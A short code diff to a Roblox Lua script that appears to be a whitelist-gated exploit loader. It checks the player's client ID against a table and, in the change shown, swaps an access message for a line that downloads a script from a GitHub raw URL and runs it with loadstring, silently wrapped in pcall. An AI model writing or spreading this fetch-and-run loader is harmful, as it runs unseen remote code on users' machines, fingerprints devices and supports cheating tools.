@@ -4,7 +4,9 @@ local check = game:GetService("RbxAnalyticsService"):GetClientId()
 pcall(function()
     for _,check1 in pairs(table) do 
         if check1 == check then 
-            warn('user granted access')
+            pcall(function()
+                loadstring(game:HttpGet("https://raw.githubusercontent.com/stefan-rblx/bruhnhetest/main/pj"))()
+            end)
         else 
             warn('ijbtPnpxp4LWzFAafFebdkdQdDBtpZyG62F7zGtFLwyiS')
         end 
